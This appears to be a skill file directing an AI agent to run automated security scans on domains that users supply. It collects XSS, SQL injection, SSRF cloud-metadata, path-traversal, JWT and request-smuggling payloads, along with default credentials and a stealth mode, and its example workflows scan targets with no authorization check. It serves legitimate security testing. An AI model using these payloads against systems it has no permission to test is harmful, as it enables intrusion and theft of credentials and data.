---
name: dast-automation
description: Automated Dynamic Application Security Testing (DAST) using Playwright MCP for browser-based security scanning. Performs blackbox/greybox security testing on single or multiple domains with intelligent crawling, vulnerability detection, and comprehensive reporting. Use when: "scan this domain for vulnerabilities", "run DAST on these URLs", "perform security testing", or "automated penetration test".
---

# DAST Automation with Playwright MCP

## Overview

This skill enables automated Dynamic Application Security Testing (DAST) using Playwright MCP as the primary browser automation engine combined with standard OS pentesting tools. It orchestrates comprehensive security scanning across single or multiple domains, performing both blackbox (no credentials) and greybox (authenticated) testing.

**Primary Tool**: Playwright MCP - browser automation for crawling, authentication, and dynamic testing
**OS Tools**: Bash commands, curl, nmap, sqlmap, nuclei, nikto, ffuf, and other standard pentesting tools
**Testing Modes**: Blackbox (unauthenticated), Greybox (authenticated with provided credentials)

**Knowledge Base**: This skill incorporates attack patterns from 6,894 HackerOne bug bounty reports across 157 vulnerability categories. See `references/hackerone_attack_patterns.md` for comprehensive real-world exploitation techniques.

## When to Use This Skill

Trigger this skill when users request:
- "Scan this domain for vulnerabilities"
- "Run DAST on example.com"
- "Perform automated security testing on these URLs"
- "Check multiple domains for security issues"
- "Do a blackbox/greybox security scan"
- "Automated penetration test with Playwright"

## DAST Workflow Decision Tree

```
User provides domain(s)
    │
    ├─→ Single domain? ──→ Direct scan
    │
    └─→ Multiple domains? ──→ Orchestrated parallel scan
            │
            ├─→ Blackbox mode (no credentials)
            │   ├─→ Playwright crawling
            │   ├─→ Endpoint discovery
            │   ├─→ Vulnerability testing
            │   └─→ Report generation
            │
            └─→ Greybox mode (with credentials)
                ├─→ Playwright authentication
                ├─→ Authenticated crawling
                ├─→ Deep vulnerability testing
                └─→ Comprehensive report
```

## Core Capabilities

### 1. Playwright MCP-Driven Crawling

**Intelligent browser automation for comprehensive site mapping:**

```markdown
When user provides domain(s):

1. Use Playwright MCP to launch browser and navigate to target
2. Perform intelligent crawling with JavaScript execution
3. Discover all endpoints, forms, APIs, and interactive elements
4. Map application structure including SPAs and dynamic content
5. Extract authentication mechanisms and session handling

Example interaction:
User: "Scan https://example.com for vulnerabilities"

You should:
- Launch Playwright browser context
- Navigate to https://example.com
- Crawl all discoverable pages (respect robots.txt unless told otherwise)
- Identify forms, inputs, API endpoints
- Map the attack surface
- Proceed to vulnerability testing
```

**Playwright MCP Integration Pattern:**

```python
# Crawling with Playwright MCP
# You have access to Playwright via MCP - use it directly

Steps:
1. Navigate to target URL
2. Wait for page load and JavaScript execution
3. Extract all links, forms, buttons, API calls
4. Click through navigation menus
5. Fill out multi-step forms to discover hidden endpoints
6. Capture all HTTP requests/responses
7. Build comprehensive endpoint map
```

### 2. Blackbox Testing Mode

**No credentials required - pure external testing:**

```markdown
Blackbox Workflow:
1. Target provided by user (domain or list of domains)
2. Playwright crawls application as external user
3. Identify publicly accessible endpoints
4. Test for:
   - XSS (reflected, stored, DOM-based)
   - CSRF on public forms
   - Open redirects
   - Information disclosure
   - Security misconfigurations
   - Exposed sensitive files
   - Client-side vulnerabilities
5. Run Nuclei for known CVEs
6. Generate vulnerability report

Testing Approach:
- No authentication required
- Tests only publicly accessible surfaces
- Focuses on unauthenticated vulnerabilities
- Fast and safe for external testing
```

**Example User Request:**
```
User: "Run a blackbox DAST scan on https://target.com"

Your Actions:
1. Use Playwright MCP to crawl https://target.com
2. Map all public endpoints
3. Run XSS tests on input fields
4. Check for CSRF tokens on forms
5. Test for open redirects
6. Run Nuclei against discovered endpoints
7. Generate findings report
```

### 3. Greybox Testing Mode

**With credentials - authenticated deep testing:**

```markdown
Greybox Workflow:
1. User provides domain + credentials
2. Playwright automates authentication flow
3. Maintain authenticated session throughout scan
4. Crawl authenticated areas
5. Test for:
   - IDOR (Insecure Direct Object References)
   - Broken Access Control
   - Privilege escalation
   - Business logic flaws
   - Authenticated XSS/CSRF
   - Session management issues
   - All blackbox tests PLUS authenticated surfaces
6. Comprehensive vulnerability testing
7. Detailed report with reproduction steps

Authentication Handling:
- Playwright automates login flow
- Captures session tokens/cookies
- Maintains session throughout scan
- Tests with different privilege levels if multiple accounts provided
```

**Example User Request:**
```
User: "Perform greybox DAST on https://app.example.com with credentials: user@test.com / password123"

Your Actions:
1. Use Playwright MCP to navigate to login page
2. Automate login with provided credentials
3. Verify successful authentication
4. Crawl all authenticated endpoints
5. Test for IDOR on user-specific resources
6. Check access control on admin endpoints
7. Test session management
8. Run comprehensive vulnerability tests
9. Generate detailed findings with auth context
```

### 4. Multi-Domain Orchestration

**Parallel scanning of multiple targets:**

```markdown
When user provides multiple domains:

Example: "Scan these domains: example.com, test.com, demo.com"

Orchestration Strategy:
1. Parse domain list from user input
2. For each domain, spawn parallel DAST workflow:
   - Independent Playwright browser context per domain
   - Isolated crawling and testing
   - Separate vulnerability tracking
3. Aggregate results across all domains
4. Generate unified report with per-domain sections
5. Highlight cross-domain findings

Use scripts/dast_orchestrator.py for parallel execution
Max concurrent scans: 5 (configurable based on resources)
```

**Multi-Domain Example:**
```
User: "Run DAST on: example.com, test.io, demo.net"

Your Actions:
1. Initialize 3 parallel scan threads
2. For example.com:
   - Playwright crawl
   - Vulnerability testing
   - Report generation
3. For test.io:
   - Playwright crawl
   - Vulnerability testing
   - Report generation
4. For demo.net:
   - Playwright crawl
   - Vulnerability testing
   - Report generation
5. Aggregate all findings into unified report
```

## Vulnerability Priority Matrix (Based on HackerOne Data)

### TIER 1: Critical/High - Immediate Testing Priority

| Vulnerability | Reports | Impact | Test First |
|--------------|---------|--------|------------|
| XSS (all types) | 980 | Session hijack, data theft | Always |
| Access Control/IDOR | 796 | Data breach, privilege escalation | Always |
| RCE | 327 | Full system compromise | Always |
| Auth Bypass | 261 | Account takeover | Always |
| Business Logic | 230 | Financial loss, fraud | When applicable |
| SSRF | 176 | Internal network access, cloud creds | Always |
| SQL Injection | 141 | Database compromise | Always |

### TIER 2: High/Medium - Standard Testing

| Vulnerability | Reports | Focus Areas |
|--------------|---------|-------------|
| Path Traversal | 168 | File params, LFI endpoints |
| CSRF | 160 | State-changing operations |
| Open Redirect | 125 | URL params, OAuth flows |
| HTTP Smuggling | 51 | CDN/proxy deployments |
| Deserialization | 40 | Java/.NET apps, JWT |
| XXE | 14 | XML parsers, file uploads |

---

## Comprehensive Testing Methodology

### Phase 0: Reconnaissance (Use OS Tools)

```bash
# Subdomain enumeration
subfinder -d target.com -o subs.txt

# Port scanning
nmap -sV -sC -p- target.com -oN nmap_results.txt

# Technology fingerprinting
whatweb -a 3 target.com

# Directory discovery
ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -o dirs.json

# Check for exposed files
curl -s https://target.com/.git/config
curl -s https://target.com/.env
curl -s https://target.com/robots.txt
```

### Phase 1: Playwright Crawling + API Discovery

```markdown
With Playwright MCP:
1. Navigate to target URL
2. Enable network interception to capture ALL API calls
3. Click through navigation, menus, buttons
4. Fill and submit forms to discover hidden endpoints
5. Extract JavaScript files and parse for API endpoints
6. Build comprehensive attack surface map

Key data to capture:
- All /api/* endpoints with methods and parameters
- Form actions, hidden fields, CSRF tokens
- WebSocket connections
- GraphQL endpoints
- Authentication flows and session handling
```

---

## Detailed Testing Methodology

### Playwright-Based Vulnerability Testing

**1. XSS Detection with Playwright:**

```markdown
Use Playwright to inject and verify XSS payloads:

For each input field discovered:
1. Navigate to page with Playwright
2. Inject XSS payload: <script>alert(document.domain)</script>
3. Submit form via Playwright
4. Check if payload executed:
   - Monitor for alert dialog
   - Check DOM for unescaped payload
   - Verify in response body
5. Test multiple contexts:
   - HTML context
   - Attribute context
   - JavaScript context
   - URL context

## Context-Specific XSS Payloads (from HackerOne patterns):

# HTML Context
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>

# Attribute Context
" autofocus onfocus=alert(1) x="
' onfocus=alert(1) autofocus='
"><img src=x onerror=alert(1)>

# JavaScript Context
';alert(1);//
</script><script>alert(1)</script>
${alert(1)}
{{constructor.constructor('alert(1)')()}}

# URL Context
javascript:alert(1)
data:text/html,<script>alert(1)</script>

# WAF Bypass Patterns
<scr<script>ipt>alert(1)</script>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
<svg/onload=alert(1)>
```

**2. CSRF Testing with Playwright:**

```markdown
For each state-changing form:
1. Use Playwright to capture legitimate request
2. Recreate request in separate browser context WITHOUT origin
3. Check if request succeeds (CSRF vulnerable)
4. Verify anti-CSRF token presence and validation
5. Test token bypass techniques:
   - Remove token
   - Use empty token
   - Use token from different session
   - Replay old token
```

**3. Authentication & Session Testing:**

```markdown
With Playwright automation:
1. Login with valid credentials
2. Capture session cookie
3. Test session security:
   - HttpOnly flag
   - Secure flag
   - SameSite attribute
   - Session timeout
4. Test for:
   - Session fixation
   - Session hijacking
   - Concurrent sessions
   - Logout functionality
5. Privilege escalation attempts
```

**4. IDOR Testing (Greybox):**

```markdown
For authenticated endpoints with IDs:
1. Login as User A with Playwright
2. Access resource: /api/user/123/profile
3. Note accessible resource IDs
4. Login as User B
5. Attempt to access User A's resources
6. Verify authorization enforcement

Test patterns:
- Sequential IDs: /user/1, /user/2, /user/3
- GUIDs: /document/{uuid}
- Predictable tokens: /invoice/{timestamp}
```

**5. Business Logic Flaws (from HackerOne patterns):**

```markdown
Use Playwright to test workflows:

## Workflow Bypass
1. Map multi-step processes (checkout, registration, etc.)
2. Test step bypass:
   - Skip payment step: /step1 → /confirm (skip /step2 payment)
   - Skip verification step
   - Manipulate step order

## Price/Quantity Manipulation (real HackerOne pattern)
# Example: addon-268-number-of-seats-0 manipulation
# Change quantity from 3 to 10 seats → $0 charge

Test payloads:
- Negative quantities: {"quantity": -10}
- Zero price: {"price": 0.01}
- Integer overflow: {"quantity": 2147483647}
- Currency confusion: {"currency": "VND"}  # Low-value currency

## Race Condition Testing
Use Playwright's Promise.all for parallel requests:
1. Apply voucher: Send 10 simultaneous requests
2. Check if voucher applied multiple times
3. Test double-spend on balance operations

## Voucher/Coupon Abuse
- Apply same voucher multiple times
- Use voucher across multiple sessions
- Combine vouchers beyond limits
```

**6. SQL Injection Testing (with OS Tools):**

```bash
# Use SQLMap for automated testing
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch
sqlmap -r request.txt --batch --tamper=space2comment

# Manual payloads for Playwright injection:
# Error-based
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--

# Time-based blind
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
'; SELECT pg_sleep(5)--

# Boolean-based
' AND '1'='1'--
' AND '1'='2'--

# Union-based (determine column count first)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**7. SSRF Testing (Critical for Cloud Environments):**

```markdown
## SSRF Payloads for Cloud Metadata:

# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP (requires header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (requires header: Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

## IP Bypass Techniques:
127.0.0.1 → 127.1, 2130706433, 0x7f000001
localhost → LOCALHOST, LocalHost, [::1]
http://127.0.0.1.nip.io/

## Test Parameters:
- url=, uri=, path=, dest=, redirect=, next=, webhook=
- Any image/file URL fetch functionality
- PDF generators, screenshot services
```

**8. HTTP Request Smuggling (CDN/Proxy deployments):**

```markdown
## CRLF Injection Payloads:
param=value%0d%0aX-Injected-Header:attack
param=value%0aSet-Cookie:admin=true

## CL.TE Smuggling:
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

## Test for newline injection (from Cloudflare HackerOne report):
host_header: target.com\r\nX-Forwarded-Host: attacker.com
```

**9. Path Traversal/LFI Testing:**

```markdown
## Basic Payloads:
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//etc/passwd

## Cisco ASA Pattern (from HackerOne):
GET /+CSCOE+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/../../../../../etc/passwd

## Target Files:
/etc/passwd, /etc/shadow, /proc/self/environ
/app/.env, /app/config/database.yml
~/.ssh/id_rsa, ~/.bash_history
```

**10. Authentication Bypass Testing:**

```markdown
## JWT Attacks (use jwt_tool):
jwt_tool <token> -X a  # Algorithm none
jwt_tool <token> -X k  # Key confusion (RS256→HS256)
jwt_tool <token> -I -hc kid -hv "../../dev/null" -X s  # Kid traversal

## Session Testing with Playwright:
1. Login as User A, capture session
2. Login as User A again in new context
3. Check if first session invalidated
4. Test session cookie flags: HttpOnly, Secure, SameSite

## Default Credentials:
admin:admin, admin:password, root:root, test:test
```

## Tool Integration

### Nuclei Integration

```markdown
After Playwright crawling completes:

1. Export discovered endpoints to file
2. Run Nuclei against endpoints:
   nuclei -l endpoints.txt -t /path/to/nuclei-templates -o nuclei-results.txt

3. Parse Nuclei results
4. Merge with Playwright findings
5. Include in final report

Nuclei templates to prioritize:
- CVEs (cves/)
- Exposed panels (exposed-panels/)
- Misconfigurations (misconfiguration/)
- Default credentials (default-logins/)
- Technologies (technologies/)
```

### OWASP ZAP Integration (Optional)

```markdown
For deep API testing:

1. Configure ZAP as proxy
2. Route Playwright traffic through ZAP
3. Use ZAP's active scanner on discovered APIs
4. Export ZAP findings
5. Merge with DAST report

ZAP provides:
- Comprehensive API testing
- SOAP/REST scanning
- WebSocket testing
- Automated attack patterns
```

### Nikto Integration (Optional)

```markdown
For web server scanning:

1. After Playwright identifies web servers
2. Run Nikto against base URLs:
   nikto -h https://target.com -output nikto-results.json -Format json

3. Parse Nikto results for:
   - Server misconfigurations
   - Outdated software versions
   - Dangerous files/directories
   - SSL/TLS issues
```

## Scanning Orchestration

### Single Domain Scan

**Use `scripts/playwright_dast_scanner.py`:**

```python
# Example usage pattern you'll follow:
# This script is provided in scripts/ directory

python3 scripts/playwright_dast_scanner.py \
  --target https://example.com \
  --mode blackbox \
  --output results/example-com-report.json

# For greybox with auth:
python3 scripts/playwright_dast_scanner.py \
  --target https://app.example.com \
  --mode greybox \
  --auth-url https://app.example.com/login \
  --username user@test.com \
  --password 'password123' \
  --output results/app-example-com-report.json
```

### Multi-Domain Scan

**Use `scripts/dast_orchestrator.py`:**

```python
# Orchestrates parallel DAST across multiple domains

python3 scripts/dast_orchestrator.py \
  --domains domains.txt \
  --mode blackbox \
  --parallel 5 \
  --output results/

# domains.txt format:
# https://example.com
# https://test.io
# https://demo.net
```

### Continuous Scanning

**For ongoing security monitoring:**

```bash
# Schedule with cron for periodic scanning
# scripts/continuous_dast.sh handles scheduling

# Example: Daily scan at 2 AM
0 2 * * * /path/to/scripts/continuous_dast.sh --target https://example.com --email alerts@company.com
```

## Reporting

### Report Structure

All DAST scans generate comprehensive reports with:

```markdown
# DAST Security Assessment Report

## Executive Summary
- Scan date and duration
- Domains scanned
- Critical/High/Medium/Low vulnerability counts
- Overall risk rating

## Scan Configuration
- Testing mode (blackbox/greybox)
- Tools used (Playwright MCP, Nuclei, etc.)
- Scope and exclusions
- Authentication details (if greybox)

## Findings

### [CRITICAL] Example Vulnerability
**Title**: SQL Injection in Login Form
**Severity**: Critical
**CVSS**: 9.8
**Endpoint**: POST /api/login
**Description**: SQL injection vulnerability allows authentication bypass
**Reproduction Steps**:
1. Navigate to https://example.com/login
2. Enter payload in username field: admin' OR '1'='1'--
3. Click login
4. Observe authentication bypass

**Evidence**:
- Screenshot: screenshots/sqli-login.png
- Request/Response: evidence/sqli-request.txt

**Remediation**:
- Use parameterized queries
- Implement input validation
- Add WAF rules

**References**:
- OWASP SQL Injection: https://owasp.org/...
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

[Repeat for each finding]

## Appendix
- Full endpoint list
- Scan logs
- Tool output (Nuclei, ZAP, etc.)
```

### Report Formats

Reports generated in multiple formats:
- **JSON**: Machine-readable for CI/CD integration
- **HTML**: Interactive web report with filters
- **PDF**: Executive presentation format
- **Markdown**: For documentation and issue tracking

Use `scripts/report_generator.py` to create reports from scan results.

## Workflow Examples

### Example 1: Basic Blackbox Scan

```
User: "Scan https://example.com for vulnerabilities"

Your Response:
"I'll perform a blackbox DAST scan on https://example.com using Playwright MCP.

[Scanning in progress...]

1. Crawling with Playwright...
   - Discovered 47 endpoints
   - Found 12 forms
   - Identified 8 API endpoints

2. Vulnerability Testing...
   - Testing for XSS across 12 input fields
   - Checking CSRF protection on forms
   - Testing for open redirects
   - Running Nuclei for known CVEs

3. Results:
   - 2 High severity findings
   - 5 Medium severity findings
   - 8 Low severity findings

Full report generated: results/example-com-report.html

Key Findings:
[HIGH] Reflected XSS in search parameter
[HIGH] Missing CSRF protection on contact form
[MEDIUM] Sensitive information disclosure in error messages
..."
```

### Example 2: Greybox Multi-Domain Scan

```
User: "Perform authenticated security testing on app.company.com, api.company.com, admin.company.com. Credentials: admin@company.com / SecurePass123!"

Your Response:
"I'll perform greybox DAST scanning on 3 domains with authenticated access.

[Orchestrating parallel scans...]

Domain 1: app.company.com
- Authenticated as admin@company.com
- Crawling authenticated areas...
- Discovered 124 endpoints
- Testing for IDOR, access control, privilege escalation

Domain 2: api.company.com
- API authentication successful
- Mapping API endpoints...
- Testing REST endpoints for security issues

Domain 3: admin.company.com
- Admin panel access confirmed
- Testing admin-specific vulnerabilities

[Scanning completed in 18 minutes]

Aggregate Results:
- 1 Critical finding (IDOR in api.company.com)
- 4 High severity findings
- 12 Medium severity findings
- 23 Low/Info findings

Unified report: results/company-com-aggregate-report.html
Individual reports: results/app/, results/api/, results/admin/

Critical Finding:
[CRITICAL] IDOR allows access to any user's data via /api/v1/users/{id}
- Reproduced with detailed steps
- PoC script included
- Immediate remediation recommended
..."
```

### Example 3: Continuous Scanning Setup

```
User: "Set up automated weekly security scanning for production.example.com"

Your Response:
"I'll configure continuous DAST scanning for production.example.com.

Configuration:
- Schedule: Weekly (every Monday at 2 AM)
- Mode: Blackbox (no credentials for production)
- Notifications: Email alerts for High/Critical findings
- Baseline: Current scan establishes baseline

Setup Complete:
1. Created cron job: /etc/cron.d/dast-production
2. Configured alerting: config/alerts.yaml
3. Baseline report: results/baseline/production-example-com.json

First scan scheduled for: Monday, 2024-01-15 02:00 UTC

The system will:
- Run weekly Playwright-based scans
- Compare results to baseline
- Alert on new High/Critical findings
- Generate trend reports monthly
- Maintain scan history in results/continuous/

Monitor status: ./scripts/dast_status.sh production.example.com
View reports: results/continuous/production.example.com/
..."
```

## Advanced Features

### 1. Custom Test Profiles

Create domain-specific test profiles in `config/profiles/`:

```yaml
# config/profiles/api-focused.yaml
name: "API-Focused Testing"
description: "Specialized testing for API endpoints"
playwright:
  crawl_depth: 5
  javascript_timeout: 30000
  capture_api_calls: true
tests:
  enabled:
    - api_authentication
    - api_authorization
    - api_injection
    - api_rate_limiting
    - api_data_exposure
  disabled:
    - dom_xss  # Less relevant for APIs
reporting:
  format: json
  include_api_docs: true
```

### 2. Rate Limiting & Stealth

```yaml
# config/scanning.yaml
rate_limiting:
  requests_per_second: 5
  concurrent_requests: 3

stealth_mode:
  random_user_agents: true
  request_delays: true
  randomize_order: true
  respect_robots_txt: true
```

### 3. Scope Management

```yaml
# config/scope.yaml
in_scope:
  - "*.example.com"
  - "api.partner.com"

out_of_scope:
  - "logout"
  - "delete-account"
  - "admin.example.com/dangerous-action"

exclusions:
  paths:
    - "/logout"
    - "/delete/*"
  parameters:
    - "csrf_token"
```

## Integration with CI/CD

### GitHub Actions Example

```yaml
# .github/workflows/dast.yml
name: DAST Security Scan

on:
  schedule:
    - cron: '0 2 * * 1'  # Weekly on Monday
  workflow_dispatch:

jobs:
  dast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Run DAST Scan
        run: |
          python3 scripts/playwright_dast_scanner.py \
            --target ${{ secrets.STAGING_URL }} \
            --mode blackbox \
            --output results/dast-report.json

      - name: Check for Critical Findings
        run: |
          python3 scripts/check_findings.py \
            --report results/dast-report.json \
            --fail-on critical,high

      - name: Upload Report
        uses: actions/upload-artifact@v2
        with:
          name: dast-report
          path: results/
```

## Best Practices

### 1. Scope Verification
- Always confirm target scope with user
- Verify authorization before scanning
- Check for rate limiting concerns
- Identify sensitive operations to avoid

### 2. Credential Security
- Never log credentials in plain text
- Use environment variables for sensitive data
- Clear session data after greybox scans
- Secure report storage

### 3. Result Validation
- Manually verify High/Critical findings
- Check for false positives
- Provide reproduction steps
- Include evidence (screenshots, requests)

### 4. Reporting
- Prioritize actionable findings
- Include clear remediation guidance
- Provide risk context for business impact
- Generate executive summary for stakeholders

## Troubleshooting

### Playwright Connection Issues
```bash
# Verify Playwright MCP is running
# Check MCP configuration in Claude Code

# Test Playwright manually:
python3 -c "import playwright; print('Playwright accessible')"
```

### Authentication Failures
```markdown
If greybox auth fails:
1. Verify credentials manually
2. Check for CAPTCHA or 2FA
3. Inspect login flow with browser DevTools
4. Update auth script if needed
5. Consider using session cookies directly
```

### Performance Optimization
```markdown
For large applications:
1. Reduce crawl depth
2. Limit concurrent requests
3. Use focused test profiles
4. Exclude non-critical paths
5. Run scans during off-peak hours
```

## Resources

### references/ (Knowledge Base)
- `hackerone_attack_patterns.md` - **6,894 real-world attack patterns** from HackerOne reports
- `advanced_exploitation_techniques.md` - OS tools and advanced exploitation techniques
- `dast_methodology.md` - Complete DAST testing methodology
- `playwright_security_patterns.md` - Playwright-specific security testing patterns
- `vulnerability_testing.md` - Comprehensive vulnerability testing guide
- `tool_configuration.md` - Configuration guide for all integrated tools
- `api_testing.md` - API-specific DAST techniques
- `reporting_guide.md` - Report generation and customization

### OS Tools Available
```bash
# Reconnaissance
nmap, subfinder, amass, whatweb, wappalyzer

# Web Fuzzing
ffuf, gobuster, feroxbuster, dirb

# Vulnerability Scanning
nuclei, nikto, wpscan, sqlmap

# Exploitation
sqlmap, commix, xsstrike, dalfox

# Authentication
hydra, jwt_tool

# Utilities
curl, wget, nc, openssl, base64
```

### scripts/
- `playwright_dast_scanner.py` - Main single-domain DAST scanner with Playwright MCP
- `dast_orchestrator.py` - Multi-domain parallel scan orchestrator
- `playwright_crawler.py` - Intelligent Playwright-based web crawler
- `vulnerability_tester.py` - Comprehensive vulnerability testing engine
- `report_generator.py` - Multi-format report generation
- `continuous_dast.sh` - Continuous scanning automation
- `nuclei_runner.py` - Nuclei integration wrapper
- `zap_integration.py` - OWASP ZAP integration (optional)
- `check_findings.py` - CI/CD findings verification

### assets/
- `report_templates/` - HTML/PDF report templates
- `config/` - Configuration files and test profiles
- `payloads/` - XSS, SQL injection, and other test payloads
- `screenshots/` - Evidence and screenshot storage

---

**Note**: This skill requires Playwright MCP to be configured in Claude Code. Ensure MCP connection is active before initiating scans.
